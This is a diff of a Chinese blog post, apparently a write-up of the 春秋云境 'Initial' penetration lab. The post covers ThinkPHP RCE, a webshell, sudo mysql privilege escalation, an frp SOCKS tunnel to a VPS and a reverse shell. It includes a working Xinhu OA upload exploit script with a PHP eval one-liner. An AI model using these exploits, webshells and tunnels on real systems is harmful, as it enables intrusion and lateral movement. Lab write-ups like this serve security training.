@@ -1,11 +1,11 @@
-<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>春秋云境-Initial | St4rr's Blog</title><meta name="author" content="St4rr"><meta name="copyright" content="St4rr"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="先上fscan扫一遍，扫出thinkphp一个rce的洞  用工具，getshell  写个马进去  蚁剑连接   当前用户是www-data，需要提权 发现可以sudo提权，mysql被配置了root权限，去gtfobins上查一下   查找所有名字含flag的文件，找到flag01.txt   看下内网ip  用蚁剑传个fscan上去扫描一下（记得chmod 777 fscan）  可以看到除">
+<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>春秋云境-Initial | St4rr's Blog</title><meta name="author" content="St4rr"><meta name="copyright" content="St4rr"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="先上fscan扫一遍，扫出thinkphp一个rce的洞   img  用工具，getshell   img  写个马进去   img  蚁剑连接   img    img  当前用户是www-data，需要提权 发现可以sudo提权，mysql被配置了root权限，去gtfobins上查一下   img    img  查找所有">
 <meta property="og:type" content="article">
 <meta property="og:title" content="春秋云境-Initial">
 <meta property="og:url" content="https://www.blog.st4rr.top/posts/c1334500/index.html">
 <meta property="og:site_name" content="St4rr&#39;s Blog">
-<meta property="og:description" content="先上fscan扫一遍，扫出thinkphp一个rce的洞  用工具，getshell  写个马进去  蚁剑连接   当前用户是www-data，需要提权 发现可以sudo提权，mysql被配置了root权限，去gtfobins上查一下   查找所有名字含flag的文件，找到flag01.txt   看下内网ip  用蚁剑传个fscan上去扫描一下（记得chmod 777 fscan）  可以看到除">
+<meta property="og:description" content="先上fscan扫一遍，扫出thinkphp一个rce的洞   img  用工具，getshell   img  写个马进去   img  蚁剑连接   img    img  当前用户是www-data，需要提权 发现可以sudo提权，mysql被配置了root权限，去gtfobins上查一下   img    img  查找所有">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://www.blog.st4rr.top/img/article/Hoag.jpg">
+<meta property="og:image" content="https://www.blog.st4rr.top/img/article/milkyway.jpg">
 <meta property="article:published_time" content="2025-06-08T16:00:00.000Z">
 <meta property="article:modified_time" content="2025-08-03T02:33:36.293Z">
 <meta property="article:author" content="St4rr">
@@ -13,7 +13,7 @@
 <meta property="article:tag" content="渗透">
 <meta property="article:tag" content="春秋云境">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://www.blog.st4rr.top/img/article/Hoag.jpg"><link rel="shortcut icon" href="/img/galaxy.jpeg"><link rel="canonical" href="https://www.blog.st4rr.top/posts/c1334500/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.12.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
+<meta name="twitter:image" content="https://www.blog.st4rr.top/img/article/milkyway.jpg"><link rel="shortcut icon" href="/img/galaxy.jpeg"><link rel="canonical" href="https://www.blog.st4rr.top/posts/c1334500/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.12.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.32/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
 (function() {
   var hm = document.createElement("script");
   hm.src = "https://hm.baidu.com/hm.js?11ae8bff5150c46570a0a934313effe5";
@@ -173,68 +173,210 @@ gtag('config', 'G-MGDNR814PE');
 document.addEventListener('pjax:send', () => {
   Pace.restart()
 })
-</script><link rel="stylesheet" href="/css/center-atom.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/grey_bwm.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">91</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">65</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">6</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fa-fw fa fa-graduation-cap"></i><span> Articles</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> categories</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> tags</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> archives</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> Links</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> Comment</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/article/Hoag.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="St4rr's Blog"><img class="site-icon" src="/img/earth.png"/><span class="site-name">St4rr's Blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fa-fw fa fa-graduation-cap"></i><span> Articles</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> categories</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> tags</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> archives</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> Links</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> Comment</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">春秋云境-Initial</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-06-08T16:00:00.000Z" title="Created 2025-06-09 00:00:00">2025-06-09</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-08-03T02:33:36.293Z" title="Updated 2025-08-03 10:33:36">2025-08-03</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Writeup/">Writeup</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Writeup/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/">春秋云境</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word Count:</span><span class="word-count">554</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading Time:</span><span>2mins</span></span><span class="post-meta-separator">|</span><span class="leancloud_visitors" id="/posts/c1334500/" data-flag-title="春秋云境-Initial"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span class="leancloud-visitors-count"><i class="fa-solid fa-spinner fa-spin"></i></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">Comments:</span><a href="/posts/c1334500/#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="/posts/c1334500/" itemprop="commentCount"><i class="fa-solid fa-spinner fa-spin"></i></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>先上fscan扫一遍，扫出thinkphp一个rce的洞</p>
-<p><img src="/images/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/1749206268708-2d6f2544-e29c-432d-a5bf-a7ae7d4ccac6.png" alt="img"></p>
+</script><link rel="stylesheet" href="/css/center-atom.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/grey_bwm.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">91</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">65</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">6</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fa-fw fa fa-graduation-cap"></i><span> Articles</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> categories</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> tags</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> archives</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> Links</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> Comment</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/article/milkyway.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="St4rr's Blog"><img class="site-icon" src="/img/earth.png"/><span class="site-name">St4rr's Blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fa-fw fa fa-graduation-cap"></i><span> Articles</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> categories</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> tags</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> archives</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> Links</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> Comment</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">春秋云境-Initial</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-06-08T16:00:00.000Z" title="Created 2025-06-09 00:00:00">2025-06-09</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-08-03T02:33:36.293Z" title="Updated 2025-08-03 10:33:36">2025-08-03</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Writeup/">Writeup</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Writeup/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/">春秋云境</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word Count:</span><span class="word-count">578</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading Time:</span><span>2mins</span></span><span class="post-meta-separator">|</span><span class="leancloud_visitors" id="/posts/c1334500/" data-flag-title="春秋云境-Initial"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span class="leancloud-visitors-count"><i class="fa-solid fa-spinner fa-spin"></i></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">Comments:</span><a href="/posts/c1334500/#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="/posts/c1334500/" itemprop="commentCount"><i class="fa-solid fa-spinner fa-spin"></i></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>先上fscan扫一遍，扫出thinkphp一个rce的洞</p>
+<figure>
+<img
+src="/images/春秋云境-Initial/1749206268708-2d6f2544-e29c-432d-a5bf-a7ae7d4ccac6.png"
+alt="img" />
+<figcaption aria-hidden="true">img</figcaption>
+</figure>
 <p>用工具，getshell</p>
-<p><img src="/images/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/1749206453409-442aafc9-c62a-4267-8408-fea19e18e254.png" alt="img"></p>
+<figure>
+<img
+src="/images/春秋云境-Initial/1749206453409-442aafc9-c62a-4267-8408-fea19e18e254.png"
+alt="img" />
+<figcaption aria-hidden="true">img</figcaption>
+</figure>
 <p>写个马进去</p>
-<p><img src="/images/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/1749207569606-85ba01f6-fe85-4a32-a449-0223ebe5d527.png" alt="img"></p>
+<figure>
+<img
+src="/images/春秋云境-Initial/1749207569606-85ba01f6-fe85-4a32-a449-0223ebe5d527.png"
+alt="img" />
+<figcaption aria-hidden="true">img</figcaption>
+</figure>
 <p>蚁剑连接</p>
-<p><img src="/images/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/1749207618780-0fd43bd7-0bf8-41ec-ba8d-da9ad3903648.png" alt="img"></p>
-<p><img src="/images/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/1749207665392-04afcbb3-0d0f-431d-9765-59030d75a592.png" alt="img"></p>
+<figure>
+<img
+src="/images/春秋云境-Initial/1749207618780-0fd43bd7-0bf8-41ec-ba8d-da9ad3903648.png"
+alt="img" />
+<figcaption aria-hidden="true">img</figcaption>
+</figure>
+<figure>
+<img
+src="/images/春秋云境-Initial/1749207665392-04afcbb3-0d0f-431d-9765-59030d75a592.png"
+alt="img" />
+<figcaption aria-hidden="true">img</figcaption>
+</figure>
 <p>当前用户是www-data，需要提权</p>
 <p>发现可以sudo提权，mysql被配置了root权限，去gtfobins上查一下</p>
-<p><img src="/images/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/1749207813416-b4cc8388-883b-412d-853c-57a72163c2f4.png" alt="img"></p>
-<p><img src="/images/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/1749207857536-c5bd1540-64c0-4513-ba39-064f9cb00620.png" alt="img"></p>
+<figure>
+<img
+src="/images/春秋云境-Initial/1749207813416-b4cc8388-883b-412d-853c-57a72163c2f4.png"
+alt="img" />
+<figcaption aria-hidden="true">img</figcaption>
+</figure>
+<figure>
+<img
+src="/images/春秋云境-Initial/1749207857536-c5bd1540-64c0-4513-ba39-064f9cb00620.png"
+alt="img" />
+<figcaption aria-hidden="true">img</figcaption>
+</figure>
 <p>查找所有名字含flag的文件，找到flag01.txt</p>
-<p><img src="/images/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/1749208381490-b667f738-9fe1-427a-a4f8-ee29be2410ff.png" alt="img"></p>
-<p><img src="/images/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/1749208422413-b9746b7c-e7bf-4d70-8366-1b1e83a90a00.png" alt="img"></p>
+<figure>
+<img
+src="/images/春秋云境-Initial/1749208381490-b667f738-9fe1-427a-a4f8-ee29be2410ff.png"
+alt="img" />
+<figcaption aria-hidden="true">img</figcaption>
+</figure>
+<figure>
+<img
+src="/images/春秋云境-Initial/1749208422413-b9746b7c-e7bf-4d70-8366-1b1e83a90a00.png"
+alt="img" />
+<figcaption aria-hidden="true">img</figcaption>
+</figure>
 <p>看下内网ip</p>
-<p><img src="/images/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/1749210701594-53fa0119-5d24-47f0-af1a-4954035dbfae.png" alt="img"></p>
+<figure>
+<img
+src="/images/春秋云境-Initial/1749210701594-53fa0119-5d24-47f0-af1a-4954035dbfae.png"
+alt="img" />
+<figcaption aria-hidden="true">img</figcaption>
+</figure>
 <p>用蚁剑传个fscan上去扫描一下（记得chmod 777 fscan）</p>
-<p><img src="/images/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/1749215898261-6a8c5cc5-63f6-446d-875f-67d1404aa4f9.png" alt="img"></p>
+<figure>
+<img
+src="/images/春秋云境-Initial/1749215898261-6a8c5cc5-63f6-446d-875f-67d1404aa4f9.png"
+alt="img" />
+<figcaption aria-hidden="true">img</figcaption>
+</figure>
 <p>可以看到除了我们打下来的这台主机外，还有三台主机：一台是信呼OA服务器，一台是DC域控，一台是个有永恒之蓝的洞的windows</p>
 <p>接下来配置frp转发流量</p>
 <p>frpc.ini</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">serverAddr = &quot;60.204.245.37&quot;</span><br><span class="line">serverPort = 7000</span><br><span class="line"></span><br><span class="line">[socks_proxy]</span><br><span class="line">type = tcp</span><br><span class="line">remote_port =6000</span><br><span class="line">plugin = socks5</span><br></pre></td></tr></table></figure>
-
 <p>frps.ini</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bindPort = 7000</span><br></pre></td></tr></table></figure>
-
 <p>frpc通过蚁剑上传，frps上传到自己的vps上</p>
-<p><img src="/images/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/1749217425334-edf443f6-cb69-4f42-b994-6347fbe50309.png" alt="img"></p>
+<figure>
+<img
+src="/images/春秋云境-Initial/1749217425334-edf443f6-cb69-4f42-b994-6347fbe50309.png"
+alt="img" />
+<figcaption aria-hidden="true">img</figcaption>
+</figure>
 <p>用msf弹shell</p>
-<p><img src="/images/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/1749231433589-6d412d74-e775-48fe-a731-119aa355674c.png" alt="img"></p>
+<figure>
+<img
+src="/images/春秋云境-Initial/1749231433589-6d412d74-e775-48fe-a731-119aa355674c.png"
+alt="img" />
+<figcaption aria-hidden="true">img</figcaption>
+</figure>
 <p>将reverse.elf用蚁剑上传</p>
-<p><img src="/images/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/1749231468914-cec1c1dc-2a0d-4b27-973a-be0a0a99e4e2.png" alt="img"></p>
-<p><img src="/images/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/1749231448816-dc23ddbb-af90-47f7-b9da-55231c267067.png" alt="img"></p>
-<p><img src="/images/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/1749231592809-829c3271-286b-467e-a007-cc2e3dceff67.png" alt="img"></p>
+<figure>
+<img
+src="/images/春秋云境-Initial/1749231468914-cec1c1dc-2a0d-4b27-973a-be0a0a99e4e2.png"
+alt="img" />
+<figcaption aria-hidden="true">img</figcaption>
+</figure>
+<figure>
+<img
+src="/images/春秋云境-Initial/1749231448816-dc23ddbb-af90-47f7-b9da-55231c267067.png"
+alt="img" />
+<figcaption aria-hidden="true">img</figcaption>
+</figure>
+<figure>
+<img
+src="/images/春秋云境-Initial/1749231592809-829c3271-286b-467e-a007-cc2e3dceff67.png"
+alt="img" />
+<figcaption aria-hidden="true">img</figcaption>
+</figure>
 <p>自己电脑上用proxifier代理</p>
-<p><img src="/images/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/1749231690003-bafa3cfc-e462-46e9-a0d4-5e50ddce1023.png" alt="img"></p>
+<figure>
+<img
+src="/images/春秋云境-Initial/1749231690003-bafa3cfc-e462-46e9-a0d4-5e50ddce1023.png"
+alt="img" />
+<figcaption aria-hidden="true">img</figcaption>
+</figure>
 <p>代理规则</p>
-<p><img src="/images/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/1749232113631-bfe75ab9-9948-427e-9a6b-20eb4f54179a.png" alt="img"></p>
-<p>先看信呼OA，用admin&#x2F;admin123弱口令登录成功</p>
-<p><img src="/images/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/1749475325786-bed8acd4-ee7e-4b55-be65-51608bd4c10a.png" alt="img"></p>
+<figure>
+<img
+src="/images/春秋云境-Initial/1749232113631-bfe75ab9-9948-427e-9a6b-20eb4f54179a.png"
+alt="img" />
+<figcaption aria-hidden="true">img</figcaption>
+</figure>
+<p>先看信呼OA，用admin/admin123弱口令登录成功</p>
+<figure>
+<img
+src="/images/春秋云境-Initial/1749475325786-bed8acd4-ee7e-4b55-be65-51608bd4c10a.png"
+alt="img" />
+<figcaption aria-hidden="true">img</figcaption>
+</figure>
 <p>用现成脚本打，先放一个一句话木马1.php与脚本保存在同一路径下</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span><span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br><span class="line">import requests</span><br><span class="line">session = requests.<span class="title function_ invoke__">session</span>()</span><br><span class="line">url_pre = <span class="string">&#x27;http://172.22.1.18/&#x27;</span></span><br><span class="line">url1 = url_pre + <span class="string">&#x27;?a=check&amp;m=login&amp;d=&amp;ajaxbool=true&amp;rnd=533953&#x27;</span></span><br><span class="line">url2 = url_pre + <span class="string">&#x27;/index.php?a=upfile&amp;m=upload&amp;d=public&amp;maxsize=100&amp;ajaxbool=true&amp;rnd=798913&#x27;</span></span><br><span class="line">url3 = url_pre + <span class="string">&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=11&#x27;</span></span><br><span class="line">data1 = &#123;</span><br><span class="line">    <span class="string">&#x27;rempass&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;jmpass&#x27;</span>: <span class="string">&#x27;false&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;device&#x27;</span>: <span class="string">&#x27;1625884034525&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ltype&#x27;</span>: <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;adminuser&#x27;</span>: <span class="string">&#x27;YWRtaW4=&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;adminpass&#x27;</span>: <span class="string">&#x27;YWRtaW4xMjM=&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;yanzm&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">r = session.<span class="title function_ invoke__">post</span>(url1, data=data1)</span><br><span class="line">r = session.<span class="title function_ invoke__">post</span>(url2, files=&#123;<span class="string">&#x27;file&#x27;</span>: <span class="title function_ invoke__">open</span>(<span class="string">&#x27;1.php&#x27;</span>, <span class="string">&#x27;r+&#x27;</span>)&#125;)</span><br><span class="line">filepath = <span class="title function_ invoke__">str</span>(r.<span class="title function_ invoke__">json</span>()[<span class="string">&#x27;filepath&#x27;</span>])</span><br><span class="line">filepath = <span class="string">&quot;/&quot;</span> + filepath.<span class="title function_ invoke__">split</span>(<span class="string">&#x27;.uptemp&#x27;</span>)[<span class="number">0</span>] + <span class="string">&#x27;.php&#x27;</span></span><br><span class="line">id = r.<span class="title function_ invoke__">json</span>()[<span class="string">&#x27;id&#x27;</span>]</span><br><span class="line"><span class="keyword">print</span>(id)</span><br><span class="line"><span class="keyword">print</span>(filepath)</span><br><span class="line">url3 = url_pre + f<span class="string">&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=&#123;id&#125;&#x27;</span></span><br><span class="line">r = session.<span class="title function_ invoke__">get</span>(url3)</span><br><span class="line">r = session.<span class="title function_ invoke__">get</span>(url_pre + filepath + <span class="string">&quot;?1=system(&#x27;dir&#x27;);&quot;</span>)</span><br><span class="line"><span class="keyword">print</span>(r.text)</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/1749475563878-5f0d4de0-5e40-4a58-a9da-2b11903d8fdc.png" alt="img"></p>
+<figure>
+<img
+src="/images/春秋云境-Initial/1749475563878-5f0d4de0-5e40-4a58-a9da-2b11903d8fdc.png"
+alt="img" />
+<figcaption aria-hidden="true">img</figcaption>
+</figure>
 <p>在蚁剑上配置一下代理，然后连接</p>
-<p><img src="/images/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/1749475729653-fe269c93-cfd3-42c7-a429-f428c08c8db8.png" alt="img"></p>
-<p>在C:&#x2F;Users&#x2F;Administrator&#x2F;flag&#x2F;flag02.txt找到第二段flag</p>
-<p><img src="/images/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/1749475856401-ace247b8-87a6-420b-93f1-7b5c4ce672e0.png" alt="img"></p>
+<figure>
+<img
+src="/images/春秋云境-Initial/1749475729653-fe269c93-cfd3-42c7-a429-f428c08c8db8.png"
+alt="img" />
+<figcaption aria-hidden="true">img</figcaption>
+</figure>
+<p>在C:/Users/Administrator/flag/flag02.txt找到第二段flag</p>
+<figure>
+<img
+src="/images/春秋云境-Initial/1749475856401-ace247b8-87a6-420b-93f1-7b5c4ce672e0.png"
+alt="img" />
+<figcaption aria-hidden="true">img</figcaption>
+</figure>
 <p>给kali配置一下代理</p>
-<p><img src="/images/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/1749476022346-85c27bbb-6b3f-4e57-b926-cb6eac027482.png" alt="img"></p>
-<p><img src="/images/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83-Initial/1749476008958-fe703602-1b9d-4583-b7a3-e5c03eae7e61.png" alt="img"></p>
+<figure>
+<img
+src="/images/春秋云境-Initial/1749476022346-85c27bbb-6b3f-4e57-b926-cb6eac027482.png"
+alt="img" />
